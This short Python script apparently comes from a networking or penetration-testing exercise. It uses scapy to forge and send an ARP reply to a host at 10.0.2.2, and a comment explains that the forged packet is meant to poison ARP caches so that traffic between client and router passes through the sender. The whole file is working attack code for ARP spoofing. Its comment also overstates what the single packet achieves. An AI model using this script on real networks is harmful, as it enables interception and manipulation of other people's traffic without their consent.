import scapy.all as scapy
packet = scapy.ARP(op=2, pdst="10.0.2.2", hwdst="08:00:27:e6:e5:59", psrc="10.0.2.0")
# op = 2 is written for an arp packet to be a response rather than a request, this packet makes client think that we have router's address and router think that we have clients address
scapy.send(packet)